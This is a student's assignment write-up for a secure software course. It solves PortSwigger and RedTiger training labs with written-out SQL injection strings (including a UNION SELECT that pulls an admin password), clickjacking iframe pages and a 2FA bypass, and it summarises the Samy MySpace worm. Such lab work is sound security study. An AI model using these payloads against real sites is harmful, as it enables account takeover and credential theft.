# Assignment 4 - Secure Software Development

## Assignment Preparation
The link provided did not function with the first 6 characters of my name, nor did any of the other websites on the internet. So, I went to Gemini. 
![](Pasted%20image%2020240328172632.png)![](Pasted%20image%2020240328172642.png)
I then went to a simple site that displays colours based on what you input.
![](Pasted%20image%2020240328172712.png)
 ![](Pasted%20image%2020240328172721.png)

# **Assignment Tasks**
Q1 - Web Security Labs
==
[PortSwigger Labs](https://portswigger.net/web-security/all-labs)
![](Pasted%20image%2020240328193215.png)
## Lab #1: SQLi Vulnerability in WHERE Clause
![](Pasted%20image%2020240401121335.png)

- The lab consists of finding a vulnerability that overrides the category selector without having to rely on released being `1`, aka only showing released products. The solution detailed below solves this and displays the **unreleased** products.
- I solved this by adding a single quote `'`, followed by an `or`, which leads into a statement that always resolves to true, like `1=1`, and to finish I appended the starting of a comment in SQL (`--`).
```sql
%27+or+1=1--
```

## Lab #2: SQLi Vulnerability Allowing Login Bypass
![](Pasted%20image%2020240405202502.png)
- This lab consists of finding a vulnerability that bypasses the login form. The solution detailed below solves this and allows us to log-in to the `administrator` account.
- I solved this lab by first clicking on the "My Account" page, and attempted to log-in with a single quote `'`. This returned an `Interal Server Error`. The next attack has a high chance of succeeding because we were redirected instead of getting denied access and shown `Invalid username OR password`. I was able to gain access to the administrator account page by doing the following, as shown below. First, I wrote out `administrator` for the account name, followed by a single quote, which should "complete" the string literal. Then, I added two dashes, `--`, which is the comment symbol in SQL. This negated the need for me to enter the correct password. Any random input will do.
```sql
administrator'--
```

## Lab #3: # Basic Clickjacking with CSRF Token Protection
![](Pasted%20image%2020240405205702.png)
- This lab details crafting an `iframe` that sits above the delete account button. This should fool the user into clicking for some free products but instead have their account deleted.  We use `wiener:peter` to login.
- This was written into the `Body` section of the exploit server, before storing it and viewing the exploit (to test). 
```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me!!!</div>
<iframe src="https://0aa500be031cf05b849f813a002a00c8.web-security-academy.net/my-account"></iframe>
```
As you can see, with the opacity set to 0.1, you can see that the "Click me!!!" div is right on top of the delete account button.
![](Pasted%20image%2020240405205519.png)
If we change the opacity to be 0.0001%, the original page becomes completely invisible, and the user has no idea they are actually deleting their account.
![](Pasted%20image%2020240405205642.png)

## Lab #4: Clickjacking with a Frame Buster Script
![](Pasted%20image%2020240405221649.png)
- This lab builds on the previous one. This time, the `Click Me!!` clickjack should change the user's email address. The setup is mostly the same, but with a few differences. See below:
```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe 
sandbox="allow-forms"
src="https://0a3400010460682f8182e46300b8009b.web-security-academy.net/my-account?email=hacker@realweb.com">
</iframe>
```
- Here, `sandbox` is set to `allow-forms`, which gives the sandboxed content the capability to send form data, while still maintaining other restrictions based on sandboxes, like disabling plugins or preventing top navigation.
- I also changed the email to be `hacker@realweb.com`.
![](Pasted%20image%2020240405221012.png)
![](Pasted%20image%2020240405221340.png)
## Lab #5: 2FA Simple Bypass
![](Pasted%20image%2020240405222651.png)
- This lab is about bypassing two-factor authentication. We have a valid username and password to go off of (`carlos:montoya`), but we do not have the user's 2FA code. 
- The steps I took to solve this lab are as follows:
	1. First, log in to the `wiener:peter` account, and grab the 2FA code for this account via the `Email client` button. This shows the 2FA code to enter for `wiener`. ![](Pasted%20image%2020240405222311.png)
	2. Make sure you know the url for your account page, as this will help us out later. `https://0aaf00c904da36cb82f2514f00dd00f1.web-security-academy.net/my-account?id=wiener`
	3. Log out of `wiener`, and log in using the victim's credentials. (`carlos:montoya`)
	4. When you are asked for the 2FA code for `carlos`, just navigate to the url `…/my-account` ![](Pasted%20image%2020240405222606.png) ![](Pasted%20image%2020240405222621.png)
- The lab is now solved!
  
Q2 - Real-World Attack Analysis
===
## **The Samy Worm (XSS) on MySpace**
## **Summary**

- **Attacker:** Samy Kamkar, a security researcher.
- **Target:** MySpace, a popular social networking platform in the mid-2000s.
- **Date:** 2005
- **Attack Mechanism:**
	1. **Vulnerability:** MySpace allowed users some flexibility in customizing their profiles. Input filtering was insufficient, leaving a door open for Stored XSS.
	2. **Payload:** Samy Kamkar crafted a piece of JavaScript code that would:
		- Display the phrase "but most of all, samy is my hero" on the infected user's profile.
		- Automatically send a friend request to Samy.
		- Replicate itself by embedding the same code into the viewer's profile.
- **Impact:**
	- The worm spread exponentially, infecting over a million profiles within 20 hours.
	- The rapid replication overwhelmed MySpace's systems, causing the site to shut down temporarily.

## **Diagram**
1. **Attacker (Samy):** Samy inserts the malicious JavaScript payload into his MySpace profile.
2. **Victim:** An unsuspecting MySpace user visits Samy's infected profile.
3. **Malicious Code Execution:** The victim's browser loads Samy's profile and unknowingly executes the JavaScript code.
4. **Replication:** The script copies itself to the victim's own profile. The victim becomes an unwitting carrier.
5. **Friend Request:** The script sends an automated friend request from the victim's account to Samy.
6. **Exponential Spread:** Anyone who visits the victim's now-infected profile triggers the same process, perpetuating the worm's spread.
**Diagram done in draw.io**
![](Assignment%204%20-%20Q2.drawio%201.png)

## **References (in IEEE)**
[1] Land2Cyber, "Real-world examples of XSS attacks and how they were executed," Medium, https://medium.com/@Land2Cyber/real-world-examples-of-xss-attacks-and-how-they-were-executed-531e0e33e85b (accessed Apr. 6, 2024).
[2] "The MySpace worm that changed the internet forever," VICE, https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever (accessed Apr. 6, 2024).

**Important Notes**
- **Impact:** The Samy Worm is a historical example highlighting the dangers of XSS and insufficient input validation. It exposed vulnerabilities common in early social media.
- **Ethics:** While demonstrating a critical flaw, the worm's rapid spread also raised ethical questions about the line between research and potentially harmful actions.
- **Lessons Learned:** This incident spurred improvements in web security practices, emphasizing the importance of input sanitization and secure coding to prevent XSS attacks. We were "lucky" to have this worm executed on an early social media system like MySpace. If this happened now, like on Instagram or Facebook, it would be detrimental.  

# Q3 - SQL Injection Practice

## Lab #1: Red Tiger Labs
![](Pasted%20image%2020240406175914.png)
- I was on this one for a long time until I realized the URL was getting changed. 
- The SQL query for this question can be assumed as:
```sql
select * from ? where id=$cat
```
- When you click on `1` for category, you get this message above and the url changes to `?cat=1`
	 ![](Pasted%20image%2020240405225909.png)

 - By iterating on the order of table columns we can check how big the table is. `4` was the max columns I found before it errored out and said "No Category!".
	![](Pasted%20image%2020240405225932.png)

- We can also use a similar method to find out what the type of value that is returned. 
![](Pasted%20image%2020240405230244.png)
	-  The `UNION SELECT` attempts to add an extra row of data to the results.
	- `1, NULL, NULL, NULL` are the values to be inserted into the extra row.
	- `--` is a standard SQL comment, used to ignore any remaining part of the original query.
	- By iterating on this payload, and shifting the `1` over by one variable each time, we can find out that if the payload successfully displays the injected value `1` on the webpage, then the position chosen for that iteration corresponds to a column that is being rendered on the page.
	- By iterating through positions, we can determine the total number of columns the original query returns. This is important because to successfully exploit an SQL injection, we need to match the number of columns in our injected query.
![](Pasted%20image%2020240405230717.png)
	![](Pasted%20image%2020240405230803.png)
	- This works and displays `1` on the page.
![](Pasted%20image%2020240405230858.png)
	![](Pasted%20image%2020240405230908.png)
	- This also works!

- So now we know the last two columns are integers. This is helpful as we can now use these two columns to our own liking. I will use them to display the username and password from `level1_users`.
	![](Pasted%20image%2020240405231046.png)
	- ![](Pasted%20image%2020240405231117.png)
	- Now we can use those credentials to log-in!
## Lab #2: Red Tiger Labs
![](Pasted%20image%2020240406175850.png)
- This one was a lot easier (In my opinion)
	- The SQL query could be assumed as:
```sql
select * from ? where user='$username' and pass='$password'
```
- Here, all we have to do is enter in any `username`, let's say `jon`. Next, for the password, I chose `password`. To complete the attack, though, you have to phrase the query in such a way that the string literal is closed within the password `'`, followed by an OR condition that will always evaluate to true, like `or 1=1`. If you combine those into a single query, `password' or 1=1`, we can log in, and the challenge is completed.
![](Pasted%20image%2020240406180712.png)
## Lab #3: Red Tiger Labs
![](Pasted%20image%2020240406181402.png)
- This one seems hard at first glance, but if you attempt to search for `usr` with an empty array, like `usr[]`, it errors out, as it only expects a single value (long encrypted string that is username).
![](Pasted%20image%2020240406181641.png)
![](Pasted%20image%2020240406181658.png)
If we browse online for `urlcrypt.inc`, we find a page for the PHP script. It goes as follows: 
```php
<?php
function encrypt($str)
{
    $cryptedstr = "";
    for ($i =0; $i < strlen($str); $i++) {
        $temp = ord(substr($str, $i, 1)) ^ 192;

        while (strlen($temp)<3) {
            $temp = "0".$temp;
        }
        $cryptedstr .= $temp. "";
    }
    return base64_encode($cryptedstr);
}

function decrypt($str)
{
    if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $str)) {
        $str = base64_decode($str);
        if ($str != "" && $str != null && $str != false) {
            $decStr = "";

            for ($i=0; $i < strlen($str); $i+=3) {
                $array[$i/3] = substr($str, $i, 3);
            }

            foreach ($array as $s) {
                $a = $s^192;
                $decStr .= chr($a);
            }

            return $decStr;
        }
        return false;
    }
    return false;
}
```
[PHP Code Link](https://redtiger.labs.overthewire.org/urlcrypt.inc)
- The user details of the Admin account are as follows:
  ![](Pasted%20image%2020240406182336.png)
  ![](Pasted%20image%2020240406182345.png)
   `usr = MDQyMjExMDE0MTgyMTQw`
- If we find and use a PHP compiler online, we can encrypt the new SQL command and use the output as the password for `Admin`.
- I'm not going to breakdown the PHP code, but I will explain the `echo` function I added to receive the encrypted password.
  
```php
echo(encrypt('\' union select 1,username,3,4,5,password,7 from level3_users where username=\'Admin\'#'));
```

- To start, it calls the `encrypt` function from above. The SQLi string within the single quotes is passed as input to the `encrypt` function
  
```sql
'\' union select 1,username,3,4,5,password,7 from level3_users where username=\'Admin\'#'
```

   - **Terminating the Original Query ( `'\'` )**:
	- The string begins with a single quote followed by a backslash (`'\'`). This aims to close off a part of a pre-existing SQL query the code might be embedded into, allowing the attacker to add their own malicious query. This operates the same way as terminating with a single quote for a string `'`.
- **UNION SELECT**:
	- This is the core of the SQL injection. `UNION` allows combining results from multiple `SELECT` statements.
	- The injected code selects specific columns from a table named `level3_users`:
		- `1`: a placeholder for a column in the original query.
		- `username`, `password`: Extracting sensitive user data.
		- `3,4,5,7`: These are placeholders or attempts to select other potentially useful columns.
- **Targeting the 'Admin' User (`where username=\'Admin\'`)**:
	- This filters the results to focus on extracting the credentials of the 'Admin' user.
- **Commenting Out the Rest (`#`)**:
	- The trailing `'#'` is a common SQL comment character. It aims to ignore any remaining portion of the original query, preventing potential errors.

![](Pasted%20image%2020240406185543.png)
- By compiling the PHP code online using 5.x, and printing to the screen the encrypted string we get. If we use said encrypted string as the parameter to pass into the `usr` parameter in the URL, we find out the Admin's password, as shown below:

**Viewing Admin User Profile**
![](Pasted%20image%2020240406185731.png)

**After entering in the encrypted string in the URL while viewing the Admin profile**
![](Pasted%20image%2020240406185855.png)

- We now see the Admin's password in the `First name` section. It is `thisisaverysecurepasswordEEE5rt`.
- Once entered in, it works! We are logged in as `Admin`!
  
![](Pasted%20image%2020240406190056.png)

# Proving I Did the RedTiger Labs
After submitting I realized I never took screenshots with my coloured personal name. It is much easier to prove to you that I did them all myself rather than going and re-doing all of my screenshots.

Not only did I take each key and upload it to WeChall, but I also took a screenshot of my entire desktop so you can see it matches up with the rest of the screenshots.
![](Pasted%20image%2020240406190832.png)
![](Pasted%20image%2020240406190850.png)
![](Pasted%20image%2020240406190915.png)
**The Chronoblaze moniker is my own, and my discord proves that:**
![](Pasted%20image%2020240406190956.png)
![](Pasted%20image%2020240406191009.png)

I hope this is proof enough.
# Bonus - Extended SQL Injection Labs
- I decided not to do any of these as I am extremely busy right now. I hope this assignment format is up to par.